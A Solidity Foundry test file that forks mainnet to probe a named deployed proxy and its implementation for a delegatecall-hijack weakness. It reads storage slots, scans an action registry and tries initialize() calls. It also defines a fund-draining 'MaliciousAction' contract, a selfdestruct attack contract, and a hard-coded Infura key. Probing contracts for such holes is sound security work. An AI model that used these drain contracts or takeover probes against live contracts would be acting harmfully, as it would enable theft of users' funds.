// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IActionRegistry {
    function getAddr(bytes4 _actionId) external view returns (address);
    function owner() external view returns (address);
    function addNewAction(bytes4 _id, address _actionAddr) external;
    function changeActionAddr(bytes4 _id, address _newAddr) external;
}

interface IActionExecutor {
    function ACTION_REGISTRY() external view returns (address);
    function EXECUTE_ACTION_SELECTOR() external view returns (bytes4);
    function executeActions(
        bytes4[] calldata _actionIds,
        bytes[] calldata _actionCallData,
        uint8[][] calldata _paramMapping
    ) external payable;
}

// Malicious action to drain funds
contract MaliciousAction {
    function executeAction(bytes calldata, uint8[] calldata, bytes32[] calldata) external returns (bytes32) {
        // Attempt to drain ETH
        address attacker = address(0xdead);
        uint256 balance = address(this).balance;
        if (balance > 0) {
            (bool success,) = attacker.call{value: balance}("");
            require(success, "ETH drain failed");
        }
        return bytes32(balance);
    }
}

// Selfdestruct attack contract
contract SelfDestructAttack {
    function attack(address target) external {
        selfdestruct(payable(msg.sender));
    }
}

contract DelegatecallHijackTest is Test {
    address constant PROXY = 0x60D2D94ACB969CA54e781007Ee89f04C1a2E9943;
    address constant IMPLEMENTATION = 0xb1593193Bcd7CEcc3d19597658003d735D1e9E94;

    // EIP-1967 storage slots
    bytes32 constant IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    bytes32 constant ADMIN_SLOT = 0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103;
    bytes32 constant BEACON_SLOT = 0xa3f0ad74e5423aebfd80d3ef4346578335a9a72aeaee59ff6cb3582b35133d50;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";

    function setUp() public {
        vm.createSelectFork(RPC_URL);
    }

    function test_AnalyzeProxySlots() public view {
        console.log("=== PROXY ANALYSIS ===");
        console.log("Proxy address:", PROXY);
        console.log("Declared Implementation:", IMPLEMENTATION);

        // Read EIP-1967 implementation slot
        bytes32 implSlotValue = vm.load(PROXY, IMPLEMENTATION_SLOT);
        address implFromSlot = address(uint160(uint256(implSlotValue)));
        console.log("EIP-1967 Implementation slot value:", implFromSlot);

        // Read admin slot
        bytes32 adminSlotValue = vm.load(PROXY, ADMIN_SLOT);
        address adminFromSlot = address(uint160(uint256(adminSlotValue)));
        console.log("EIP-1967 Admin slot value:", adminFromSlot);

        // Read beacon slot
        bytes32 beaconSlotValue = vm.load(PROXY, BEACON_SLOT);
        address beaconFromSlot = address(uint160(uint256(beaconSlotValue)));
        console.log("EIP-1967 Beacon slot value:", beaconFromSlot);

        // Check first few storage slots (for non-EIP-1967 proxies)
        console.log("\n=== RAW STORAGE SLOTS ===");
        for (uint i = 0; i < 10; i++) {
            bytes32 slotValue = vm.load(PROXY, bytes32(i));
            if (slotValue != bytes32(0)) {
                console.log("Slot", i, ":", vm.toString(slotValue));
            }
        }

        // Check proxy bytecode size
        uint256 proxyCodeSize;
        assembly {
            proxyCodeSize := extcodesize(0x60d2D94aCB969CA54e781007eE89F04c1A2e9943)
        }
        console.log("\nProxy code size:", proxyCodeSize);

        // Check implementation bytecode size
        uint256 implCodeSize;
        assembly {
            implCodeSize := extcodesize(0xb1593193Bcd7CEcc3d19597658003d735D1e9E94)
        }
        console.log("Implementation code size:", implCodeSize);
    }

    function test_AnalyzeImplementationDirectly() public view {
        console.log("\n=== IMPLEMENTATION DIRECT ANALYSIS ===");

        IActionExecutor impl = IActionExecutor(IMPLEMENTATION);

        // Get ACTION_REGISTRY address
        try impl.ACTION_REGISTRY() returns (address registry) {
            console.log("ACTION_REGISTRY:", registry);

            // Analyze the registry
            IActionRegistry reg = IActionRegistry(registry);
            try reg.owner() returns (address owner) {
                console.log("Registry Owner:", owner);
            } catch {
                console.log("Registry owner() call failed");
            }
        } catch {
            console.log("ACTION_REGISTRY() call failed");
        }

        try impl.EXECUTE_ACTION_SELECTOR() returns (bytes4 selector) {
            console.log("EXECUTE_ACTION_SELECTOR:", vm.toString(bytes32(selector)));
        } catch {
            console.log("EXECUTE_ACTION_SELECTOR() call failed");
        }
    }

    function test_CheckProxyOwnership() public {
        console.log("\n=== PROXY OWNERSHIP ANALYSIS ===");

        // Try calling owner() on proxy
        (bool success, bytes memory data) = PROXY.staticcall(abi.encodeWithSignature("owner()"));
        if (success && data.length >= 32) {
            address owner = abi.decode(data, (address));
            console.log("Proxy owner():", owner);
        } else {
            console.log("Proxy owner() call failed");
        }

        // Try calling admin() on proxy
        (success, data) = PROXY.staticcall(abi.encodeWithSignature("admin()"));
        if (success && data.length >= 32) {
            address admin = abi.decode(data, (address));
            console.log("Proxy admin():", admin);
        } else {
            console.log("Proxy admin() call failed");
        }

        // Check if proxy has any balance
        console.log("Proxy ETH balance:", PROXY.balance);
        console.log("Implementation ETH balance:", IMPLEMENTATION.balance);
    }

    function test_ScanRegistryForActions() public view {
        console.log("\n=== ACTION REGISTRY SCAN ===");

        IActionExecutor impl = IActionExecutor(IMPLEMENTATION);
        address registryAddr;

        try impl.ACTION_REGISTRY() returns (address reg) {
            registryAddr = reg;
            console.log("Registry address:", registryAddr);
        } catch {
            console.log("Could not get registry");
            return;
        }

        // Scan for common action IDs
        IActionRegistry registry = IActionRegistry(registryAddr);

        // Try some common action selector patterns
        bytes4[] memory testIds = new bytes4[](10);
        testIds[0] = bytes4(keccak256("FL_ACTION"));
        testIds[1] = bytes4(keccak256("SWAP_ACTION"));
        testIds[2] = bytes4(keccak256("TRANSFER_ACTION"));
        testIds[3] = bytes4(keccak256("WITHDRAW_ACTION"));
        testIds[4] = bytes4(keccak256("SUPPLY_ACTION"));
        testIds[5] = bytes4(keccak256("BORROW_ACTION"));
        testIds[6] = bytes4(keccak256("PAYBACK_ACTION"));
        testIds[7] = bytes4(0x00000001);
        testIds[8] = bytes4(0x00000002);
        testIds[9] = bytes4(0x00000003);

        for (uint i = 0; i < testIds.length; i++) {
            try registry.getAddr(testIds[i]) returns (address actionAddr) {
                if (actionAddr != address(0)) {
                    console.log("Found action for ID", vm.toString(bytes32(testIds[i])));
                    console.log("  -> Address:", actionAddr);
                }
            } catch {}
        }
    }

    function test_CheckImplementationInitialization() public {
        console.log("\n=== IMPLEMENTATION INITIALIZATION CHECK ===");

        // Check storage slot 0 of implementation (often used for initialization flag)
        bytes32 slot0 = vm.load(IMPLEMENTATION, bytes32(0));
        console.log("Implementation slot 0:", vm.toString(slot0));

        // Check if there's an initializable pattern
        // OpenZeppelin Initializable uses slot keccak256("eip1967.proxy.initialized")
        bytes32 initializedSlot = keccak256("eip1967.proxy.initialized");
        bytes32 initValue = vm.load(IMPLEMENTATION, initializedSlot);
        console.log("OZ Initialized slot:", vm.toString(initValue));

        // Try calling initialize if it exists
        (bool success,) = IMPLEMENTATION.call(abi.encodeWithSignature("initialize()"));
        console.log("initialize() call success:", success);

        (success,) = IMPLEMENTATION.call(abi.encodeWithSignature("initialize(address)", address(this)));
        console.log("initialize(address) call success:", success);
    }

    function test_DirectDelegatecallToImplementation() public {
        console.log("\n=== DIRECT DELEGATECALL TEST ===");

        // The implementation is designed to be used via delegatecall
        // If someone calls it directly, the ACTION_REGISTRY is an immutable
        // so it should work the same way

        IActionExecutor impl = IActionExecutor(IMPLEMENTATION);

        // Try calling executeActions with empty arrays (should not revert if no actions)
        bytes4[] memory actionIds = new bytes4[](0);
        bytes[] memory actionCallData = new bytes[](0);
        uint8[][] memory paramMapping = new uint8[][](0);

        try impl.executeActions(actionIds, actionCallData, paramMapping) {
            console.log("Empty executeActions succeeded");
        } catch Error(string memory reason) {
            console.log("Empty executeActions failed:", reason);
        } catch {
            console.log("Empty executeActions failed (unknown error)");
        }
    }

    function test_ProxyDelegatecallContext() public {
        console.log("\n=== PROXY DELEGATECALL CONTEXT ===");

        // When calling the proxy, it delegatecalls to implementation
        // The implementation then delegatecalls to actions
        // This means actions execute in the PROXY's context

        // Check what the ACTION_REGISTRY returns when called through proxy
        (bool success, bytes memory data) = PROXY.staticcall(
            abi.encodeWithSignature("ACTION_REGISTRY()")
        );

        if (success && data.length >= 32) {
            address registry = abi.decode(data, (address));
            console.log("Registry via proxy:", registry);

            // This should be the same as calling implementation directly
            // since ACTION_REGISTRY is immutable
        } else {
            console.log("ACTION_REGISTRY() via proxy failed");
        }
    }

    function test_AnalyzeProxyBytecode() public view {
        console.log("\n=== PROXY BYTECODE ANALYSIS ===");

        bytes memory proxyCode = PROXY.code;
        console.log("Proxy bytecode length:", proxyCode.length);

        // Print first 100 bytes for pattern recognition
        console.log("First 100 bytes of proxy bytecode:");
        bytes memory first100 = new bytes(100);
        for (uint i = 0; i < 100 && i < proxyCode.length; i++) {
            first100[i] = proxyCode[i];
        }
        console.logBytes(first100);

        // Check for common proxy patterns
        // EIP-1167 minimal proxy starts with 0x363d3d373d3d3d363d73
        if (proxyCode.length == 45) {
            console.log("Could be EIP-1167 minimal proxy (clone)");
        }

        // Check for DELEGATECALL opcode (0xF4)
        bool hasDelegatecall = false;
        for (uint i = 0; i < proxyCode.length; i++) {
            if (proxyCode[i] == 0xf4) {
                hasDelegatecall = true;
                console.log("Found DELEGATECALL opcode at position:", i);
            }
        }

        if (!hasDelegatecall) {
            console.log("No DELEGATECALL opcode found - might use CALL instead");
        }
    }

    function test_ScanMoreStorageSlots() public view {
        console.log("\n=== EXTENDED STORAGE SCAN ===");

        // Scan more slots including common patterns
        bytes32[] memory interestingSlots = new bytes32[](10);
        interestingSlots[0] = IMPLEMENTATION_SLOT;
        interestingSlots[1] = ADMIN_SLOT;
        interestingSlots[2] = BEACON_SLOT;
        interestingSlots[3] = keccak256("eip1967.proxy.implementation");
        interestingSlots[4] = keccak256("org.zeppelinos.proxy.implementation");
        interestingSlots[5] = keccak256("PROXIABLE");
        interestingSlots[6] = bytes32(uint256(keccak256("eip1967.proxy.admin")) - 1);
        interestingSlots[7] = keccak256("eip1967.proxy.beacon");
        interestingSlots[8] = bytes32(uint256(1)); // slot 1
        interestingSlots[9] = bytes32(uint256(2)); // slot 2

        for (uint i = 0; i < interestingSlots.length; i++) {
            bytes32 value = vm.load(PROXY, interestingSlots[i]);
            if (value != bytes32(0)) {
                console.log("Non-zero value at slot:");
                console.logBytes32(interestingSlots[i]);
                console.log("Value:");
                console.logBytes32(value);
                console.log("---");
            }
        }
    }
}
